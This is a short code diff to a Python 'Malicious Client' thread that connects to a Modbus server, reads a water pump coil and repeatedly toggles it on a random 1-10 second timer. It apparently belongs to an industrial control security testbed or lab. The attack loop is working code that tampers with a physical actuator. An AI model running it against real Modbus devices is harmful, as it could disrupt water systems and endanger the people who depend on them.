@@ -34,7 +34,11 @@ class Session(threading.Thread):
         while True:
             try:
                 if self.client.is_open: # check if server is running
-                    water_pump_current = self.client.read_coils(WATER_PUMP_ADDR)
+                    time_to_att = random.randrange(1,10)
+                    print(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
+                    logging.info(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
+                    time.sleep(time_to_att)
+                    water_pump_current = self.client.read_coils(WATER_PUMP_ADDR,1)[0]
                     if self.client.write_single_coil(WATER_PUMP_ADDR,water_pump_current ^ 1) is not True:
                         logging.warn(f"couldn't write a single coil to {self.server_ip}:{self.server_port}")
                     else:
@@ -43,12 +47,7 @@ class Session(threading.Thread):
 
                 else:
                     self.connect() # try to reconnect server
-                
-                time_to_att = random.randrange(1,10)
-                print(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
-                logging.info(f"Malicious Client attack on {self.server_ip}:{self.server_port} launches in {time_to_att} seconds")
-                time.sleep(time_to_att)
-                
+
             except Exception as e:
                 logging.error(f"{e}")
                 self.connect()
